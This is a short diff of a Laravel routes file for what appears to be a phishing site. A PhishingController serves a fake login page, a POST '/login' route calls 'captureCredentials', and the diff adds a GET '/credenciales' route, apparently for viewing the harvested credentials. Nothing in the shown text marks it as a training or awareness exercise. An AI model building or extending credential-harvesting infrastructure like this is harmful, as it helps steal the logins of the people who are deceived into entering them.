@@ -10,6 +10,8 @@ Route::get('/', function () {
 
 Route::get('/', [PhishingController::class, 'showLogin']);
 Route::post('/login', [PhishingController::class, 'captureCredentials']);
+Route::get('/credenciales', [PhishingController::class, 'FullCredenciales']);
+
 
 Route::get('/test', function () {
     return 'Laravel está funcionando';
